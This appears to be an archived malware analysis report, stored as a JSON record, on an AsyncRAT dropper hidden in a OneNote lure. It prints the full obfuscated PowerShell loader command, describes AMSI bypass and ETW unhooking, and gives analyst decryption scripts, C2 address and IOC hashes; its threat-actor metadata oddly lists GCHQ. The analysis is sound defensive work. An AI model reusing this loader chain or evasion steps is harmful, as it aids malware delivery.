{
    "id": "6cdc4448-6e94-4d95-9a26-a23ee7a47495",
    "created_at": "2023-03-03T02:06:30.023109Z",
    "updated_at": "2025-03-27T02:13:34.683543Z",
    "deleted_at": null,
    "sha1_hash": "d70b9ff8c9b5daf20fd882ac63ca7576bdc7c6fd",
    "title": "2023-02-11 - AsyncRAT OneNote Dropper",
    "authors": "",
    "file_creation_date": "2023-03-01T09:15:59Z",
    "file_modification_date": "2023-03-01T09:15:59Z",
    "file_size": 1517166,
    "plain_text": "# AsyncRAT OneNote Dropper\n\n**0xtoxin-labs.gitbook.io/malware-analysis/malware-analysis/asyncrat-onenote-dropper**\n\nWe will be covering a recent payload delivery technique leveraging OneNote documents to lure users open fake attachments and become a\nvictim of AsyncRAT malware.\n\n## OneNote Analysis\n\nThe OneNote document contains inside of itself a hidden .bat file that we can see by hovering the \"phishy\" button:\n\nPhishy OneNote Document\n\n[We can use OneDump.py in order to see what embedded files the document has and by this understand what we need to extract:](https://blog.didierstevens.com/2023/01/22/new-tool-onedump-py/)\n\nOneDump.py commandline\n\nWe can see that 2 files has .PNG magic bytes which indicates that these files are images. but the second file actually starts with @ech which\nindicates a start of a Batch script.\n\nWe can dump the file by simply applying the flags -s followed up with the file stream ID and the -d for dump:\n\nDump embedded batch file from OneNote\n\n\n-----\n\n## atc a ys s\n\nlooking at the batch script on text editor we can see 3 main things:\n\n1. 1.\n\nThe script contains broken strings that are assigned to variables.\n\n2. 2.\n\nA huge Base64 blob in the middle of the script.\n\n3. 3.\n\nA call that concatenates the broken strings into a command.\n\nBatch script content\n\nWe can use the cmd and copy paste the strings assigns and then output the final commands:\n\nDecoded commands\n\nThese are the 3 commands that are being executed by the batch script:\n\n1.\n\ncopy C:\\Windows\\System32\\WindowsPowerShell\\v1 0\\powershell exe /y \"%~0 exe\"\n\n\n-----\n\n2.\n\ncd \"%~dp0\"\n\n​\n\n3.\n\n\"%~nx0.exe\" -noprofile -windowstyle hidden -ep bypass -command $flLnL = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')\n('%~f0').Split([Environment]::NewLine);foreach ($jhglm in $flLnL) { if ($jhglm.StartsWith(':: ')) { $uDeAm = $jhglm.Substring(3); break; };\n};$dLIJD = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($uDeAm);$nJkwh = New-Object\nSystem.Security.Cryptography.AesManaged;$nJkwh.Mode = [System.Security.Cryptography.CipherMode]::CBC;$nJkwh.Padding =\n\n[System.Security.Cryptography.PaddingMode]::PKCS7;$nJkwh.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')\n('I5NM1YScgS/1//5R8gmm/tnI3DRCjxBbFnAG0xn8rTc=');$nJkwh.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')\n('mehcJXqMnXZUmnmrBD1Eeg==');$bIbyd = $nJkwh.CreateDecryptor();$dLIJD = $bIbyd.TransformFinalBlock($dLIJD, 0,\n$dLIJD.Length);$bIbyd.Dispose();$nJkwh.Dispose();$gJfcg = New-Object System.IO.MemoryStream(, $dLIJD);$dkGYN = New-Object\nSystem.IO.MemoryStream;$yfRSU = New-Object System.IO.Compression.GZipStream($gJfcg,\n\n[IO.Compression.CompressionMode]::Decompress);$yfRSU.CopyTo($dkGYN);$yfRSU.Dispose();$gJfcg.Dispose();$dkGYN.Dispose();$dLIJD\n= $dkGYN.ToArray();$qMhaY = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($dLIJD);$haTMg =\n$qMhaY.EntryPoint;$haTMg.Invoke($null, (, [string[]] ('%*')))\n\nBasically what happens is that the script copies powershell.exe to the current folder and then executes a powershell script with hidden\nwindows and execution policy set to bypass\n\n## Powershell Analysis\n\nLooking at the powershell script we can see here also 3 main parts:\n\n1. 1.\n\nIterate through the content of the batch script line by line and once a line starts with :: remove this matching pattern and stop interating.\n\n2. 2.\n\nAES decryption process.\n\n3. 3.\n\nInvoking the decrypted binary.\n\nPowerShell script content\n\nThe script will retrieve the big blob I've mentioned in the batch script analysis part and decrypt it using AES, the key for the decryption will be:\n```\nI5NM1YScgS/1//5R8gmm/tnI3DRCjxBbFnAG0xn8rTc= (in base64) and the IV will be: mehcJXqMnXZUmnmrBD1Eeg== (also in base64).\n\n```\nThe output after the decryption process will be a .gz archive that then being decompressed and the content of it will be a binary that will be\ninvoked by the script.\n\n\n-----\n\nCyberChef recipe\n\n[The CyberChef recipe can be found here​](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'Base64','string':'I5NM1YScgS/1//5R8gmm/tnI3DRCjxBbFnAG0xn8rTc%3D'%7D,%7B'option':'Base64','string':'mehcJXqMnXZUmnmrBD1Eeg%3D%3D'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D))\nI've also implemented a python script that can be used to decrypt and save the .gz archive:\n\nfrom malduck import aes\n\nfrom base64 import b64decode\n\n​\n\nBATCH_FILE_PATH = '/Users/igal/malwares/Asyncrat/OneNote/one.bat'\n\nAES_KEY = 'I5NM1YScgS/1//5R8gmm/tnI3DRCjxBbFnAG0xn8rTc='\n\nAES_IV = 'mehcJXqMnXZUmnmrBD1Eeg=='\n\nOUTPUT_ARCHIVE_PATH = '/Users/igal/malwares/Asyncrat/OneNote/one.gz'\n\n​\n\nbatchFile = open(BATCH_FILE_PATH, 'r').readlines()\n\nencFile = ''\n\nfor line in batchFile:\n\nif ':: ' in line:\n\nencFile = line[3:]\n\nbreak\n\n​\n\nkey = b64decode(AES_KEY)\n\niv = b64decode(AES_IV)\n\ndata = b64decode(encFile)\n\n​\n\nplainData = aes.cbc.decrypt(key, iv, data)\n\n​\n\nopen(OUTPUT_ARCHIVE_PATH, 'wb').write(plainData)\n\nprint(f'[+] gz archive was created in:{OUTPUT_ARCHIVE_PATH}')\n\n\n-----\n\n[+] gz archive was created in:/Users/igal/malwares/Asyncrat/OneNote/one.gz\n\n## .NET Loader\n\nnow we can analyze the loader stored in the archive. The loader is 32bit .NET assembly:\n\nDiE information\n\nI open up the loader in DnSpy in order to further analyze it. The loader has several key actions:\n\n1. 1.\n\nSet the file to be hidden and part of the system files\n\n2. 2.\n\nVM check based on computer system info\n\nEvasion - VM check\n\n1. 3.\n\n**[AMSI Bypass (similar POC code can be found here​](https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs)**\n\nEvasion - AMSI Bypass\n\n1. 4.\n\n**[ETW Unhooking which will disable the logging for Assembly.Load calls, this topic is explained in depth by XPN.](https://blog.xpnsec.com/hiding-your-dotnet-etw/)**\n\n\n-----\n\nas o U oo g\n\n1. 5.\n\nDecrypt strings which some of them used during the AMSI Bypass & ETW Unhooking procedures and other strings are part of the loader\nfunctionalities. the method that will be in charge of decrypting those strings is DCPmslvtGCDAiOhxxQvq.MvljRQYEXFVoIflOHPxg and it's\nactually another AES decryption routine which receives 3 arguments: Cipher, key, iv (after decoding those arguments from base64).\n\nStrings AES decryption method\n\nI've created a quick PowerShell script that invokes the method with the encrypted strings and prints out the decrypted strings\n\n$reflectedAsm = [System.Reflection.Assembly]::LoadFile(PATH_TO_FILE)\n\n​\n\n$mainType = $reflectedAsm.GetType(\"rwcQssqTcyOdXXoBLoie.DCPmslvtGCDAiOhxxQvq\")\n\n​\n\n$key = [System.Convert]::FromBase64String(\"iUlREPUR7NQ6ocefGLoxBty1eSNembQTSWsROZidb0A=\")\n\n$iv = [System.Convert]::FromBase64String(\"U+YnktYGyx/j43tP2+WVyw==\")\n\n​\n\n$encryptedStrings = (\"8qhzRqWw9fiH/7/a5reZMA==\", \"D/l1SD7OECP0XB2rUm87gA==\", \"lbk35FoNbOitTifMeNV97Q==\",\n\"uJDwrcc4OjLfnn4YCE0Bxw==\", \"x9nd50/ydQ4NyJMlduaTA1aZE7EpXLNuSa2GwfmjWlxjNEtyTrE+c9z9hlGIXS4Q\")\n\n​\n\nforeach ($encArg in $encryptedStrings){\n\n$decodedArg = [System.Convert]::FromBase64String($encArg)\n\n$DecResult = [System.Text.Encoding]::UTF8.GetString(($mainType.GetMethod(\"MvljRQYEXFVoIflOHPxg\")).invoke($null,@($decodedArg,\n$key, $iv)))\n\nWrite-Output $DecResult\n\n}\n\nThe decrypted strings are:\n\nAmsiScanBuffer\n\nEtwEventWrite\n\npayload.exe\n\nrunpe.dll\n\n/c choice /c y /n /d y /t 1 & attrib -h -s \"\n\nThe first two strings are part of the AMSI Bypass and ETW Unhooking procedures. payload.exe and runpe.dll are strings that the loader will\ntry to fetch from the binary resources, if we look at the resources of this binary we can see 2 resources:\n\npayload.exe\n\nTicket_Reprint.pdf The loader will iterate through the binary resources and if the name of the resource isn't one of the decrypted strings it\nwill instantly fetch the content of the resource and execute it. In our case the loader will load a fake PDF for the user:\n\n\n-----\n\nLoader binary resources\n\nResource extraction\n\nFake PDF preview\n\nThe loader will decrypt the content of payload.exe resource which will be another .gz archive and it will decompress it with the method\n```\nXWmzUoViPReUSRriqGvB.\n\n```\nDecompress method\n\nFor this I've also implemented a quick PowerShell script that will invoke those methods to retrieve the final payload\n\n$stream = $reflectedAsm.GetManifestResourceStream(\"payload.exe\")\n\n$binaryReader = New-Object System.IO.BinaryReader($stream)\n\n$contents = $binaryReader.ReadBytes($stream.Length)\n\n$DecryptedGZ = $mainType.GetMethod(\"MvljRQYEXFVoIflOHPxg\").invoke($null,@($contents, $key, $iv))\n\n\n-----\n\n$ a ay oad $ a ype Get et od( Uo eUS qG ) o e($ u, @(,$ ec yptedG ))\n\n​\n\n[io.file]::WriteAllBytes(PATH_TO_FILE,$finalPayload)\n\nNow that the loader has his final payload it will invoke the entry point of the payload and will execute a cmd command to delete the file from\ndisk:\n\nPayload invocation and file deletion\n\n## ASyncRAT Payload\n\nI will not conduct a deep analysis of the capabilities of ASyncRAT, as it's a pretty known and heavy analyzed malware, if you want to find out in\n[depth analysis of this family you can find it out here.](https://malpedia.caad.fkie.fraunhofer.de/details/win.asyncrat)\nWhat I will be doing is creating a short PowerShell script that will extract the configuration automatically for us:\n\n$reflectedAsm = [System.Reflection.Assembly]::LoadFile(\"C:\\Users\\igal\\Desktop\\AsyncRAT.bin\")\n\n​\n\n$SettingsType = $reflectedAsm.GetType(\"Client.Settings\")\n\n​\n\n($SettingsType.GetMethod(\"InitializeSettings\")).Invoke($null, $null)\n\n​\n\n$fields = $SettingsType.GetFields()\n\n​\n\nforeach ($field in $fields){\n\n$value = $field.GetValue($null)\n\nWrite-Host \"$($field.Name): $value\"\n\n}\n\nThe output will be:\n\nPorts: 6606,7707,8808\n\nHosts: 207.244.236.205\n\nVersion: 0.5.7B\n\nInstall: false\n\nInstallFolder: %AppData%\n\nInstallFile:\n\n\n-----\n\ney\n\n�i�ph� ↕� 6→#� ס� B♦� �\n\nMTX: AsyncMutex_6SI8OkPnk\n\nCertificate:\nSD58z6lYrooqCm8bVSOWmKOD2MuNYpniBO2revEinEMuHrAbTKh4Oi9w9RXFKogGADbFfzn8t6wT/IFjL83rZa69Y8HmYud8dQ2cAfYwWEfroB1\n\nServersignature:\nQcf6H60GXB8k7XU89y1GpMcXleNl4PyyrBbzxIzG2/ztlGpimu4P/YTXis20RQP/9Bd+LClqEicaIPJPR/jEhBJeOZoepuKLhOED6A0rjZjefKQIPi95Cbe\n\nServerCertificate: [Subject]\n\nCN=AsyncRAT Server\n\n​\n\n[Issuer]\n\nCN=AsyncRAT Server\n\n​\n\n[Serial Number]\n\n00AFA56C0FA71C2AD47B908F6EA2308D\n\n​\n\n[Not Before]\n\n1/1/2023 3:53:23 PM\n\n​\n\n[Not After]\n\n12/31/9999 11:59:59 PM\n\n​\n\n[Thumbprint]\n\n08A82A722AD7B5376494D7112785B366DA6CF449\n\n​\n\nAnti: false\n\naes256: Client.Algorithm.Aes256\n\nPastebin: null\n\nBDOS: false\n\nHwid: A8F7444724DA6DACA6D4\n\nDelay: 3\n\nGroup: Default\n\nWhich pretty much makes our life a bit easier with IOC extraction :)\n\n## IOC's\n\nInvoice.one - [b11b51ff96dc7a5f1cf9985087a6ad4f66980a2b2a9b1945acd43e39434c8dec​](https://bazaar.abuse.ch/sample/b11b51ff96dc7a5f1cf9985087a6ad4f66980a2b2a9b1945acd43e39434c8dec/)\nOne.bat - [9800bef9d4936ee96d4872fb686121dd7209f8b529e9bdc833c4fe54bb68f5c8​](https://bazaar.abuse.ch/sample/9800bef9d4936ee96d4872fb686121dd7209f8b529e9bdc833c4fe54bb68f5c8/)\nDotNetLoader.bin - [3c37d7351c091a9c2fce72ecde4bcd1265f148dc3b77017d468e08741091bc50​](https://bazaar.abuse.ch/sample/3c37d7351c091a9c2fce72ecde4bcd1265f148dc3b77017d468e08741091bc50/)\n[Ticket_Reprint.pdf - 101e408316eb7997bc4d2a383db92ab5a60da4742ebd7a7b8f15ca5d4d54bebe​](https://bazaar.abuse.ch/sample/101e408316eb7997bc4d2a383db92ab5a60da4742ebd7a7b8f15ca5d4d54bebe/)\nAsyncRAT.bin - [00cdee79a9afc1bf239675ba0dc1850da9e4bf9a994bb61d0ec22c9fdd3aa36f​](https://bazaar.abuse.ch/sample/00cdee79a9afc1bf239675ba0dc1850da9e4bf9a994bb61d0ec22c9fdd3aa36f/)\n[loaderDecrypt py](https://gist.github.com/0xToxin/eb643035572de18335b4f799aeb0c87d)\n\n\n-----\n\n[oade ps](https://gist.github.com/0xToxin/bf43e018245f6e24f1a9274054275653)\n[​Async.ps1​](https://gist.github.com/0xToxin/a70c56e4d9ff9de6b057f13abd84f83f)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-02-11 - AsyncRAT OneNote Dropper.pdf"
    ],
    "report_names": [
        "2023-02-11 - AsyncRAT OneNote Dropper.pdf"
    ],
    "threat_actors": [
        {
            "id": "5d2bd376-fcdc-4c6a-bc2c-17ebbb5b81a4",
            "created_at": "2022-10-25T16:07:23.667223Z",
            "updated_at": "2025-03-27T02:02:09.916086Z",
            "deleted_at": null,
            "main_name": "GCHQ",
            "aliases": [
                "Government Communications Headquarters",
                "Operation Socialist"
            ],
            "source_name": "ETDA:GCHQ",
            "tools": [
                "Prax",
                "Regin",
                "WarriorPride"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "08c8f238-1df5-4e75-b4d8-276ebead502d",
            "created_at": "2023-01-06T13:46:39.344081Z",
            "updated_at": "2025-03-27T02:00:03.056208Z",
            "deleted_at": null,
            "main_name": "Copy-Paste",
            "aliases": [],
            "source_name": "MISPGALAXY:Copy-Paste",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1677809190,
    "ts_updated_at": 1743041614,
    "ts_creation_date": 1677662159,
    "ts_modification_date": 1677662159,
    "files": {
        "pdf": "https://archive.orkl.eu/d70b9ff8c9b5daf20fd882ac63ca7576bdc7c6fd.pdf",
        "text": "https://archive.orkl.eu/d70b9ff8c9b5daf20fd882ac63ca7576bdc7c6fd.txt",
        "img": "https://archive.orkl.eu/d70b9ff8c9b5daf20fd882ac63ca7576bdc7c6fd.jpg"
    }
}